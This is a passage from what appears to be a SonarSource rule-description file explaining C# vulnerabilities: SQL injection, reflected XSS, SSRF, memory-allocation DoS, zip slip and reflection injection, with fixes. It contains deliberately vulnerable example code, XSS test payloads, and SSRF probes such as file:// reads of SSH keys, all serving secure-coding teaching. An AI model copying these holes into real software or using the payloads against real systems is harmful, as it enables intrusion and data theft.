data-diff-id=\"11\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    private readonly UserAccountContext Context;\n\n    public IActionResult Authenticate(string user, string pass)\n    {\n        var query = \"SELECT * FROM users WHERE user = '\" + user + \"' AND pass = '\" + pass + \"'\";\n\n        var queryResults = Context\n            .Database\n            .FromSqlRaw(query);\n\n        if (queryResults == 0)\n        {\n            return Unauthorized();\n        }\n\n        return Ok();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    private readonly UserAccountContext Context;\n\n    public IActionResult Authenticate(string user, string pass)\n    {\n        var query = \"SELECT * FROM users WHERE user = {0} AND pass = {1}\";\n\n        var queryResults = Context\n            .Database\n            .FromSqlRaw(query, user, pass);\n\n        if (queryResults == 0)\n        {\n            return Unauthorized();\n        }\n\n        return Ok();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5131": {
        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in ASP.NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class HelloController : Controller\n{\n    [HttpGet]\n    public void Hello(string name, HttpResponse response)\n    {\n        string html = \"&lt;h1&gt;Hello\"+ name +\"&lt;/h1&gt;\"\n        response.Write(html);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class HelloController : Controller\n{\n    [HttpGet]\n    public void Hello(string name, HttpResponse response)\n    {\n        string html = \"&lt;h1&gt;Hello\"+ HttpUtility.HtmlEncode(name) +\"&lt;/h1&gt;\"\n        response.Write(html);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>If the HTTP response is HTML code, it is highly recommended to use <a\nhref=\"https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c\">Razor-based view templates</a> to\ngenerate it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing\nthe risk of cross-site scripting vulnerabilities.</p>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end user’s point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p><code>System.Web.HttpUtility.HtmlEncode</code> is the recommended method to encode HTML entities.</p>\n<h3>Pitfalls</h3>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in ASP.NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController: Controller\n{\n    [HttpGet]\n    public IActionResult ImageFetch(string location)\n    {\n        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(location);\n\n        return Ok();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController: Controller\n{\n    private readonly string[] allowedSchemes = { \"https\" };\n    private readonly string[] allowedDomains = { \"trusted1.example.com\", \"trusted2.example.com\" };\n\n    [HttpGet]\n    public IActionResult ImageFetch(string location)\n    {\n        Uri uri = new Uri(location);\n\n        if (!allowedDomains.Contains(uri.Host) &amp;&amp; !allowedSchemes.Contains(uri.Scheme))\n        {\n            return BadRequest();\n        }\n\n        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);\n\n        return Ok();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S6639": {
        "name": "Memory allocations should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<p>Memory allocation injections occur when an application computes the size of a piece of memory to be allocated from an untrusted source. In such a\ncase, an attacker could be able to make the application unwillingly consume an important amount of memory by enforcing a large allocation size.</p>\n<h2>Why is this an issue?</h2>\n<p>By repeatedly requesting a feature that consumes a lot of memory, attackers can constantly occupy an important part of an application’s hosting\nserver memory. Depending on the application’s deployment architecture, hosting server resources and attackers' capabilities, this can lead to an\nexhaustion of the available server’s memory.</p>\n<h3>What is the potential impact?</h3>\n<p>A server that faces a memory exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed and\nhow well the hosting server configuration is hardened.</p>\n<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect\nthe whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or\nother sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>\n<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where memory usage limits are in place, the\nconsequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on\nrunning without perturbation. The mainly affected application will still stop working properly.</p>\n<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are\nbusiness-critical.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a memory allocation injection because the size of a memory allocation is determined using a user-controlled\nsource. It then performs the actual allocation without any verification or other sanitization over the provided size.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n[Route(\"NonCompliantArrayList\")]\npublic string NonCompliantArrayList()\n{\n    int size;\n    try\n    {\n        size = int.Parse(Request.Query[\"size\"]);\n    }\n    catch (FormatException)\n    {\n        return \"Number format exception while reading size\";\n    }\n    ArrayList arrayList = new ArrayList(size); // Noncompliant\n    return size + \" bytes were allocated.\";\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic const int MAX_ALLOC_SIZE = 1024;\n\n[Route(\"CompliantArrayList\")]\npublic string CompliantArrayList()\n{\n    int size;\n    try\n    {\n        size = int.Parse(Request.Query[\"size\"]);\n    }\n    catch (FormatException)\n    {\n        return \"Number format exception while reading size\";\n    }\n    size = Math.Min(size, MAX_ALLOC_SIZE);\n    ArrayList arrayList = new ArrayList(size);\n    return size + \" bytes were allocated.\";\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Enforce an upper limit</h4>\n<p>When performing a memory allocation whose size depends on a user-controlled parameter, it is of prime importance to enforce an upper limit to the\nsize being allocated. This will prevent any overly big memory slot from being consumed by a single allocation.</p>\n<p>Note that forcing an upper limit will not prevent Denial of Service attacks. When an allocation size is restricted to a reasonable amount,\nattackers can still request the allocating feature multiple times until the combined allocation size becomes big enough to cause exhaustion. However,\nthe smaller the allowed allocation size, the higher the number of necessary requests and, thus, the higher the required resources on the attacker\nside. As for most of the DoS attack vectors, a trade-off must be found to prevent most attackers from causing exhaustion while keeping a good level of\nperformance and usability.</p>\n<p>Here, the example compliant code uses the <code>Math.Min</code> function to enforce a reasonable upper bound to the allocation size. In that case,\nno more than 1024 bytes can be allocated at a time.</p>\n<h4>Harden the execution environment configuration</h4>\n<p>As a defense in depth measure, it is advised to harden the execution environment configuration regarding memory usage. This can effectively reduce\nthe scope of a successful Denial of Service attack and prevent a complete outage, potentially ranging over multiple applications.</p>\n<p>When running the application in a contained environment, like a Docker container, it is usually possible to limit the amount of memory provided to\nthe contained environment. In that case, memory exhaustion will only impact the application hosting container and not the host system.</p>\n<p>When running the application directly on a physical or heavy virtualized server, memory limits can sometimes be set on the application’s associated\nservice account. For example, the <code>ulimit</code> mechanism of Unix based operating systems can be used for that purpose. With such a limit set\nup, memory exhaustion only impacts the applications and processes owned by the related service account.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Denial_of_Service\">OWASP</a> - Denial of Service </li>\n  <li> <a href=\"https://www.linux.org/docs/man8/pam_limits.html\">Linux.org</a> - pam_limits - PAM module to limit resources </li>\n  <li> <a href=\"https://access.redhat.com/solutions/1257953\">RedHat</a> - How to set limits for services in RHEL and systemd </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/789\">CWE-789 - Memory Allocation with Excessive Size Value</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S6096": {
        "name": "Extracting archives should not lead to zip slip vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access\nthis file without validating its path first.</p>\n<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial\nintended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override arbitrary files</h4>\n<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in\nthe system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or\noperating system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file\nwithout being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    private static string TargetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)\n    {\n        ZipArchiveEntry entry = entriesEnumerator.Current;\n        string destinationPath = Path.Combine(TargetDirectory, entry.FullName);\n\n        entry.ExtractToFile(destinationPath);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    private static string TargetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)\n    {\n        ZipArchiveEntry entry = entriesEnumerator.Current;\n        string destinationPath = Path.Combine(TargetDirectory, entry.FullName);\n        string canonicalDestinationPath = Path.GetFullPath(destinationPath);\n\n        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))\n        {\n            entry.ExtractToFile(canonicalDestinationPath);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>\n<p>The validation should be done as follow:</p>\n<ol>\n  <li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code> or\n  <code>System.IO.Path.GetFileName</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity\n  regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>\n  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String TargetDirectory = \"/Users/John\";\n\npublic void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)\n{\n    ZipArchiveEntry entry = entriesEnumerator.Current;\n    string canonicalDestinationPath = Path.GetFullPath(TargetDirectory);\n\n    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))\n    {\n        entry.ExtractToFile(canonicalDestinationPath);\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://snyk.io/research/zip-slip-vulnerability\">snyk</a> - Zip Slip Vulnerability </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "roslyn.sonaranalyzer.security.cs:S6173": {
        "name": "Reflection should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to\ninspect, load or invoke a component by name.</p>\n<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code\nexecution on the server’s website.</p>\n<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the\ninitial reflection logic to an impactful malicious one.</p>\n<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected\ncode to run. The attacker can use this ability to run arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>\n<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted\nactions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate their privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new 